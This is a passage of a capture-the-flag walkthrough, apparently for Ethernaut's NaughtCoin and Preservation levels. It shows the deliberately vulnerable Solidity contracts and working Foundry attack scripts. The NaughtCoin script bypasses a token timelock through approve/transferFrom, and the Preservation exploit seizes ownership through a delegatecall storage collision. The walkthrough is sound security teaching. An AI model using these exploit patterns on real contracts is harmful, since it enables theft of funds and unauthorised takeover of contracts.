</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&#x27;openzeppelin-contracts/contracts/token/ERC20/ERC20.sol&#x27;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span> </span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">NaughtCoin</span><span> </span><span class="token" style="color:#569CD6">is</span><span> ERC20 </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#6a9955">// string public constant name = &#x27;NaughtCoin&#x27;;</span><span>
</span><span>  </span><span class="token" style="color:#6a9955">// string public constant symbol = &#x27;0x0&#x27;;</span><span>
</span><span>  </span><span class="token" style="color:#6a9955">// uint public constant decimals = 18;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">uint</span><span> </span><span class="token" style="color:#569CD6">public</span><span> timeLock </span><span class="token" style="color:#d4d4d4">=</span><span> block</span><span class="token" style="color:#d4d4d4">.</span><span>timestamp </span><span class="token" style="color:#d4d4d4">+</span><span> </span><span class="token" style="color:#b5cea8">10</span><span> </span><span class="token" style="color:#d4d4d4">*</span><span> </span><span class="token" style="color:#b5cea8">365</span><span> days</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">uint256</span><span> </span><span class="token" style="color:#569CD6">public</span><span> INITIAL_SUPPLY</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> player</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _player</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>  </span><span class="token" style="color:#dcdcaa">ERC20</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&#x27;NaughtCoin&#x27;</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&#x27;0x0&#x27;</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    player </span><span class="token" style="color:#d4d4d4">=</span><span> _player</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    INITIAL_SUPPLY </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">1000000</span><span> </span><span class="token" style="color:#d4d4d4">*</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">10</span><span class="token" style="color:#d4d4d4">**</span><span class="token" style="color:#ce9178">uint256</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">decimals</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#6a9955">// _totalSupply = INITIAL_SUPPLY;</span><span>
</span><span>    </span><span class="token" style="color:#6a9955">// _balances[player] = INITIAL_SUPPLY;</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">_mint</span><span class="token" style="color:#d4d4d4">(</span><span>player</span><span class="token" style="color:#d4d4d4">,</span><span> INITIAL_SUPPLY</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">emit</span><span> </span><span class="token" style="color:#dcdcaa">Transfer</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> player</span><span class="token" style="color:#d4d4d4">,</span><span> INITIAL_SUPPLY</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _to</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span> _value</span><span class="token" style="color:#d4d4d4">)</span><span> override </span><span class="token" style="color:#569CD6">public</span><span> lockTokens </span><span class="token" style="color:#569CD6">returns</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    super</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span>_to</span><span class="token" style="color:#d4d4d4">,</span><span> _value</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#6a9955">// Prevent the initial owner from transferring tokens until the timelock has passed</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">modifier</span><span> </span><span class="token" style="color:#dcdcaa">lockTokens</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender </span><span class="token" style="color:#d4d4d4">==</span><span> player</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>block</span><span class="token" style="color:#d4d4d4">.</span><span>timestamp </span><span class="token" style="color:#d4d4d4">&gt;</span><span> timeLock</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#569CD6">else</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>     </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>NaughtCoin imports ERC20 contract. So, it consists of all the function of ERC20 contract also.</li>
<li>NaughtCoin only implemented the <code>lockTokens()</code> modifier on <code>transfer()</code> function only.</li>
<li>There are other ways to transfer tokens from one address to other without using <code>transfer()</code></li>
<li>Player can approve the allowances of their tokens to someone, and they can use <code>transferFrom()</code> function to transfer tokens on behalf of player.</li>
</ol>
<p><strong>Level15Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level15.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    NaughtCoin </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">NaughtCoin</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x4850cbcf544F3055b6269C54C5e9bD1Ec0905EE2</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _player</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">allowance</span><span class="token" style="color:#d4d4d4">(</span><span>_player</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span>    </span><span class="token" style="color:#d4d4d4">&gt;</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Not approved&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>            instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transferFrom</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>                _player</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>                </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>                instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>_player</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>            </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>            </span><span class="token" style="color:#ce9178">&quot;Transfer to attacker failed&quot;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level15Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    NaughtCoin </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">NaughtCoin</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x4850cbcf544F3055b6269C54C5e9bD1Ec0905EE2</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#ce9178">address</span><span> player </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">player</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">uint</span><span> playerBalance </span><span class="token" style="color:#d4d4d4">=</span><span> instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>player</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        Attack attack </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>attack</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> playerBalance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">//approving attack contract and balance</span><span>
</span><span>        attack</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span>player</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level15Solution.s.sol:Level15Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Preservation</h2>
<p><strong>Level16.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Preservation</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#6a9955">// public library contracts</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> timeZone1Library</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> timeZone2Library</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> owner</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">uint</span><span> storedTime</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#6a9955">// Sets the function signature for delegatecall</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">bytes4</span><span> </span><span class="token" style="color:#569CD6">constant</span><span> setTimeSignature </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">bytes4</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">keccak256</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;setTime(uint256)&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _timeZone1LibraryAddress</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span> _timeZone2LibraryAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    timeZone1Library </span><span class="token" style="color:#d4d4d4">=</span><span> _timeZone1LibraryAddress</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    timeZone2Library </span><span class="token" style="color:#d4d4d4">=</span><span> _timeZone2LibraryAddress</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    owner </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#6a9955">// set the time for timezone 1</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setFirstTime</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span> _timeStamp</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    timeZone1Library</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">delegatecall</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodePacked</span><span class="token" style="color:#d4d4d4">(</span><span>setTimeSignature</span><span class="token" style="color:#d4d4d4">,</span><span> _timeStamp</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#6a9955">// set the time for timezone 2</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setSecondTime</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span> _timeStamp</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    timeZone2Library</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">delegatecall</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodePacked</span><span class="token" style="color:#d4d4d4">(</span><span>setTimeSignature</span><span class="token" style="color:#d4d4d4">,</span><span> _timeStamp</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#6a9955">// Simple library contract to set the time</span><span>
</span><span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">LibraryContract</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#6a9955">// stores a timestamp</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">uint</span><span> storedTime</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setTime</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span> _time</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    storedTime </span><span class="token" style="color:#d4d4d4">=</span><span> _time</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong>
The goal of this level is for you to claim ownership of the instance you are given.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>Preservation contract uses LibraryContract to set the time in the Preservation contract by using <code>delegatecall</code>.</li>
<li>So, the caller and callee contract storage layout should be matched. If not it may result in storage collision bugs.</li>
<li>Here the Preservation contract doesn’t matches the LibraryContract storage layout.</li>
<li>I observed that calling <code>setSecondTime</code> updates the <code>timeZone1Library</code> address in the Preservation contract.</li>
<li>By exploiting this we can write our own attacker contract that implements the <code>setTime()</code> function and pass that address to the <code>setSecondTime()</code> function so that it will updte the <code>timeZone1Library</code> address in the Preservation contract.</li>
<li>I implemented the Attack contract in such a way that it matches the Preservation storage layout and instead of updating the <code>storedTime</code>, i updated the <code>owner</code>. And that makes our attack contract as the owner of the Preservation contract.</li>
</ol>
<p><strong>Level16Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level16.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>      </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> timeZone1Library</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> timeZone2Library</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> owner</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> exploit </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>          Preservation instance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Preservation</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xA1979400E9bbCEcd6B13aA814281A6B95866A077</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#6a9955">//updating the timeZone1Library with attack contract address</span><span>
</span><span>          instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">setFirstTime</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint160</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>          </span><span class="token" style="color:#6a9955">/*
</span><span class="token" style="color:#6a9955">          when we call  the setFirstTime f&#x27;n again ,
</span><span class="token" style="color:#6a9955">          it delegatecall to the attack contract and then results in changing the owner to msg.sender
</span><span class="token" style="color:#6a9955">           */</span><span>
</span><span>          instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">setFirstTime</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint160</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setTime</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span> _owner</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>          owner </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint160</span><span class="token" style="color:#d4d4d4">(</span><span>_owner</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
